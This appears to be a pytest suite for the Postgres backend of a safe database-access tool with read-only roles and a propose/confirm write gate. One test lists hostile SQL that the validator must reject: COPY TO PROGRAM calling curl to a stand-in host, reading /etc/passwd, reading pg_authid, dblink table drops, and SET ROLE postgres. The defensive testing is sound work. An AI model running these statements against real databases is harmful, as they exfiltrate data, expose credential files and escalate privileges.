"""The Postgres backend, against a real Postgres.

These tests need a live server. They are the only tests in the suite that do,
and they are skipped without one, so ``SAFEDB_TEST_PG_DSN`` must be set for the
suite to actually cover this backend. CI sets it from a service container, and
:func:`test_postgres_tests_are_not_silently_skipped` fails loudly in CI if it is
somehow missing, so the skip can never quietly hide a broken backend.

Each test gets its own schema, created and dropped around it, so they can run in
any order and leave nothing behind.
"""

from __future__ import annotations

import os
import uuid

import pytest

from safe_db_mcp.backends.base import BackendError, PreviewChanged
from safe_db_mcp.backends.postgres_backend import PostgresBackend, PostgresSettings
from safe_db_mcp.engine import SafeDatabase
from safe_db_mcp.proposals import ProposalError
from safe_db_mcp.validation import SqlRejected, validate_write

DSN_ENV = "SAFEDB_TEST_PG_DSN"

pytestmark = pytest.mark.postgres

psycopg = pytest.importorskip("psycopg", reason="psycopg is an optional dependency")
conninfo_to_dict = pytest.importorskip("psycopg.conninfo").conninfo_to_dict


def _dsn() -> str | None:
    return os.environ.get(DSN_ENV)


requires_postgres = pytest.mark.skipif(
    not _dsn(), reason=f"{DSN_ENV} is not set, so there is no Postgres to test against"
)


def test_postgres_tests_are_not_silently_skipped() -> None:
    """In CI, a missing DSN is a failure rather than a quiet skip.

    Locally it is fine to run without Postgres. In CI it is not: the whole point
    of the service container is that this backend gets exercised on every push.
    """
    if os.environ.get("CI") and not _dsn():
        pytest.fail(
            f"{DSN_ENV} is unset in CI. The Postgres backend would go untested, "
            "which is exactly what the service container exists to prevent."
        )


#: Password the fixture gives the reader role it provisions. This is a throwaway
#: local test credential for a database the test also creates and drops; it is
#: not a secret and grants nothing beyond SELECT on a temporary schema.
TEST_READER_PASSWORD = "test-reader-not-a-secret"


@pytest.fixture
def pg_settings(request, monkeypatch):
    """Create a throwaway schema and reader role, then drop the schema after.

    The fixture provisions the SELECT-only reader role itself rather than
    expecting one to exist, so CI needs nothing but a stock Postgres service
    container and a DSN.
    """
    dsn = _dsn()
    if not dsn:
        pytest.skip(f"{DSN_ENV} is not set")

    schema = f"safedb_test_{uuid.uuid4().hex[:12]}"
    seed = (
        (request.config.rootpath / "safe_db_mcp" / "schema_postgres.sql")
        .read_text(encoding="utf-8")
        .replace("GRANT USAGE ON SCHEMA public", f"GRANT USAGE ON SCHEMA {schema}")
        .replace("ON ALL TABLES IN SCHEMA public", f"ON ALL TABLES IN SCHEMA {schema}")
        .replace("IN SCHEMA public GRANT SELECT", f"IN SCHEMA {schema} GRANT SELECT")
    )

    with psycopg.connect(dsn, autocommit=True) as setup:
        exists = setup.execute("SELECT 1 FROM pg_roles WHERE rolname = 'safedb_reader'").fetchone()
        if not exists:
            setup.execute(f"CREATE ROLE safedb_reader LOGIN PASSWORD '{TEST_READER_PASSWORD}'")
        else:
            setup.execute(f"ALTER ROLE safedb_reader PASSWORD '{TEST_READER_PASSWORD}'")
        setup.execute(f'CREATE SCHEMA "{schema}"')
        setup.execute(f'SET search_path TO "{schema}"')
        setup.execute(seed)

    parsed = conninfo_to_dict(dsn)
    settings = PostgresSettings(
        host=parsed.get("host", "127.0.0.1"),
        port=int(parsed.get("port", 5432)),
        database=parsed.get("dbname", "postgres"),
        schema=schema,
        reader_user="safedb_reader",
        writer_user=parsed.get("user", "postgres"),
        sslmode=parsed.get("sslmode", "disable"),
    )
    monkeypatch.setenv("SAFEDB_PG_WRITER_PASSWORD", parsed.get("password", ""))
    monkeypatch.setenv("SAFEDB_PG_READER_PASSWORD", TEST_READER_PASSWORD)
    monkeypatch.delenv("SAFEDB_CREDENTIALS", raising=False)
    try:
        yield settings, schema, dsn
    finally:
        with psycopg.connect(dsn, autocommit=True) as teardown:
            teardown.execute(f'DROP SCHEMA IF EXISTS "{schema}" CASCADE')


@pytest.fixture
def pg_database(pg_settings) -> SafeDatabase:
    """A :class:`SafeDatabase` wired to a throwaway Postgres schema."""
    settings, _, _ = pg_settings
    return SafeDatabase(backend=PostgresBackend(settings))


def read_status(dsn: str, schema: str, member_id: int) -> str | None:
    """Read a member's status directly, around the server."""
    with psycopg.connect(dsn, autocommit=True) as connection:
        connection.execute(f'SET search_path TO "{schema}"')
        row = connection.execute(
            "SELECT status FROM members WHERE id = %s", (member_id,)
        ).fetchone()
    return None if row is None else row[0]


@requires_postgres
class TestPostgresReads:
    """Reads work, and the reader role really is read only."""

    def test_list_tables(self, pg_database: SafeDatabase) -> None:
        payload = pg_database.list_tables()
        assert payload["backend"] == "postgres"
        assert payload["database"].startswith("postgresql://")
        by_name = {t["name"]: t for t in payload["tables"]}
        assert by_name["books"]["rows"] == 13
        assert by_name["authors"]["rows"] == 6

    def test_describe_table_reads_the_catalog_not_information_schema(
        self, pg_database: SafeDatabase
    ) -> None:
        # information_schema hides rows the current role has no privilege on, so
        # the SELECT-only reader would see zero constraints there. pg_catalog is
        # the same for every role, which is what makes this assertion hold.
        described = pg_database.describe_table("loans")
        assert {fk["references"] for fk in described["foreign_keys"]} == {
            "books.id",
            "members.id",
        }
        assert [c["name"] for c in described["columns"] if c["primary_key"]] == ["id"]

    def test_run_query(self, pg_database: SafeDatabase) -> None:
        result = pg_database.run_query(
            "SELECT title FROM books WHERE published_year < 1970 ORDER BY title"
        )
        assert "Things Fall Apart" in {row["title"] for row in result["rows"]}

    def test_the_reader_role_cannot_write(self, pg_settings) -> None:
        settings, _, _ = pg_settings
        backend = PostgresBackend(settings)
        with backend._connect("reader") as connection:
            with pytest.raises(psycopg.errors.Error) as caught:
                connection.execute("UPDATE members SET status = 'x' WHERE id = 1")
        # Either reason is a pass: the role has no UPDATE grant, and the
        # transaction is READ ONLY. Two independent defences.
        assert isinstance(
            caught.value,
            (psycopg.errors.InsufficientPrivilege, psycopg.errors.ReadOnlySqlTransaction),
        )


@requires_postgres
class TestPostgresWriteGate:
    """Propose previews, confirm commits, and only once."""

    def test_propose_does_not_commit(self, pg_database, pg_settings) -> None:
        _, schema, dsn = pg_settings
        assert read_status(dsn, schema, 4) == "suspended"

        proposal = pg_database.propose_change("UPDATE members SET status = 'active' WHERE id = 4")
        assert proposal["rows_affected"] == 1
        assert proposal["key_columns"] == ["id"]
        assert proposal["diff"]["updated"][0]["changed"]["status"] == {
            "before": "suspended",
            "after": "active",
        }
        assert read_status(dsn, schema, 4) == "suspended"

    def test_confirm_commits_once(self, pg_database, pg_settings) -> None:
        _, schema, dsn = pg_settings
        proposal = pg_database.propose_change("UPDATE members SET status = 'active' WHERE id = 4")
        committed = pg_database.confirm_change(proposal["change_id"])

        assert committed["status"] == "committed"
        assert committed["rows_affected"] == 1
        assert read_status(dsn, schema, 4) == "active"

        with pytest.raises(ProposalError, match="already been confirmed"):
            pg_database.confirm_change(proposal["change_id"])

    def test_insert_preview_survives_sequence_drift(self, pg_database) -> None:
        # A rolled-back preview still burns a sequence value in Postgres, so a
        # naive preview comparison would reject every insert. The comparison
        # ignores identity columns on added rows for exactly this reason.
        proposal = pg_database.propose_change(
            "INSERT INTO authors (id, name, birth_year, country) "
            "VALUES (99, 'N K Jemisin', 1972, 'United States')"
        )
        assert proposal["diff"]["added"][0]["name"] == "N K Jemisin"
        committed = pg_database.confirm_change(proposal["change_id"])
        assert committed["rows_affected"] == 1

    def test_delete_preview_shows_the_row(self, pg_database) -> None:
        proposal = pg_database.propose_change("DELETE FROM loans WHERE id = 12")
        assert [row["id"] for row in proposal["diff"]["removed"]] == [12]

    def test_a_constraint_violation_is_wrapped_and_writes_nothing(
        self, pg_database: SafeDatabase
    ) -> None:
        with pytest.raises(BackendError, match="nothing was written"):
            pg_database.propose_change(
                "INSERT INTO members (id, full_name, email, joined_on) "
                "VALUES (99, 'Copy', 'amara.osei@example.com', '2026-01-01')"
            )
        assert pg_database.list_pending_changes()["pending_count"] == 0


@requires_postgres
class TestPreviewStillHolds:
    """The concurrent-writer race, caught rather than tolerated."""

    def test_confirm_refuses_when_the_data_moved(self, pg_database, pg_settings) -> None:
        _, schema, dsn = pg_settings
        proposal = pg_database.propose_change("UPDATE members SET status = 'active' WHERE id = 4")

        # Someone else changes the row the preview was taken against.
        with psycopg.connect(dsn, autocommit=True) as other:
            other.execute(f'SET search_path TO "{schema}"')
            other.execute("UPDATE members SET status = 'lapsed' WHERE id = 4")

        with pytest.raises(ProposalError, match="changed since this change was proposed"):
            pg_database.confirm_change(proposal["change_id"])

        # Nothing was committed, and the interfering value still stands.
        assert read_status(dsn, schema, 4) == "lapsed"

    def test_a_refused_confirm_does_not_burn_the_proposal(self, pg_database, pg_settings) -> None:
        _, schema, dsn = pg_settings
        proposal = pg_database.propose_change("UPDATE members SET status = 'active' WHERE id = 4")

        with psycopg.connect(dsn, autocommit=True) as other:
            other.execute(f'SET search_path TO "{schema}"')
            other.execute("UPDATE members SET status = 'lapsed' WHERE id = 4")

        with pytest.raises(ProposalError):
            pg_database.confirm_change(proposal["change_id"])

        # The id was released rather than spent, because nothing was committed.
        # The caller can look at the current state and propose again, instead of
        # being left holding a dead id with no explanation.
        pending = pg_database.list_pending_changes()
        assert proposal["change_id"] in {c["change_id"] for c in pending["changes"]}

    def test_an_unrelated_concurrent_change_does_not_block_the_commit(
        self, pg_database, pg_settings
    ) -> None:
        # The check compares the effect of *this* change, not the state of the
        # whole table. Someone else touching a different row is not a conflict,
        # and treating it as one would make the gate useless under any real
        # traffic.
        _, schema, dsn = pg_settings
        proposal = pg_database.propose_change("DELETE FROM loans WHERE id = 12")

        with psycopg.connect(dsn, autocommit=True) as other:
            other.execute(f'SET search_path TO "{schema}"')
            other.execute("DELETE FROM loans WHERE id = 11")

        committed = pg_database.confirm_change(proposal["change_id"])
        assert committed["status"] == "committed"
        assert committed["rows_affected"] == 1

        remaining = pg_database.run_query("SELECT id FROM loans ORDER BY id")
        ids = {row["id"] for row in remaining["rows"]}
        assert 11 not in ids and 12 not in ids


@requires_postgres
class TestPostgresRejections:
    """Postgres-specific ways to be dangerous, all refused."""

    @pytest.mark.parametrize(
        "sql,fragment",
        [
            ("COPY members TO PROGRAM 'curl evil.example'", "not allowed"),
            ("COPY members FROM '/etc/passwd'", "not allowed"),
            ("DO $$ BEGIN PERFORM 1; END $$", "Dollar-quoted"),
            ("SELECT pg_read_file('/etc/passwd')", "not callable"),
            ("SELECT pg_sleep(30)", "not callable"),
            ("SELECT dblink_exec('h', 'DROP TABLE books')", "not callable"),
            ("SELECT * FROM pg_catalog.pg_authid", "internal state"),
            ("SELECT * FROM information_schema.tables", "internal state"),
            ("SET ROLE postgres", "session or server command"),
            ("SHOW hba_file", "session or server command"),
        ],
    )
    def test_dangerous_statements_never_reach_postgres(
        self, pg_database: SafeDatabase, sql: str, fragment: str
    ) -> None:
        with pytest.raises(SqlRejected, match=fragment):
            pg_database.run_query(sql)
        assert pg_database.list_pending_changes()["pending_count"] == 0

    def test_the_tables_are_all_still_there(self, pg_database: SafeDatabase) -> None:
        assert set(pg_database.table_names()) == {"authors", "books", "loans", "members"}


class TestPreviewComparisonIsBackendAgnostic:
    """The race check is engine-level, so it needs no database at all."""

    def test_a_moved_row_is_detected(self) -> None:
        from safe_db_mcp.backends.diffing import comparable

        approved = {
            "rows_affected": 1,
            "diff_available": True,
            "key_columns": ["id"],
            "diff": {
                "added": [],
                "removed": [],
                "updated": [
                    {
                        "row": {"id": 4, "status": "active"},
                        "changed": {"status": {"before": "suspended", "after": "active"}},
                    }
                ],
            },
        }
        moved = {
            "rows_affected": 1,
            "diff_available": True,
            "key_columns": ["id"],
            "diff": {
                "added": [],
                "removed": [],
                "updated": [
                    {
                        "row": {"id": 4, "status": "active"},
                        "changed": {"status": {"before": "lapsed", "after": "active"}},
                    }
                ],
            },
        }
        assert comparable(approved) != comparable(moved)

    def test_identity_columns_on_inserts_are_ignored(self) -> None:
        from safe_db_mcp.backends.diffing import comparable

        def preview(new_id: int) -> dict:
            return {
                "rows_affected": 1,
                "diff_available": True,
                "key_columns": ["id"],
                "diff": {
                    "added": [{"id": new_id, "name": "N K Jemisin"}],
                    "removed": [],
                    "updated": [],
                },
            }

        # Same insert, different sequence value. Not a conflict.
        assert comparable(preview(14)) == comparable(preview(15))

    def test_a_different_inserted_row_is_still_detected(self) -> None:
        from safe_db_mcp.backends.diffing import comparable

        first = {
            "rows_affected": 1,
            "diff_available": True,
            "key_columns": ["id"],
            "diff": {"added": [{"id": 14, "name": "A"}], "removed": [], "updated": []},
        }
        second = {
            "rows_affected": 1,
            "diff_available": True,
            "key_columns": ["id"],
            "diff": {"added": [{"id": 14, "name": "B"}], "removed": [], "updated": []},
        }
        assert comparable(first) != comparable(second)


def test_validate_write_is_shared_across_backends() -> None:
    """The grammar does not change with the backend, and should not."""
    statement = validate_write(
        "UPDATE members SET status = 'active' WHERE id = 4",
        frozenset({"members", "books"}),
    )
    assert statement.operation == "UPDATE"
    assert statement.table == "members"


def test_preview_changed_is_a_backend_error() -> None:
    """So a caller catching BackendError also catches the race."""
    assert issubclass(PreviewChanged, BackendError)
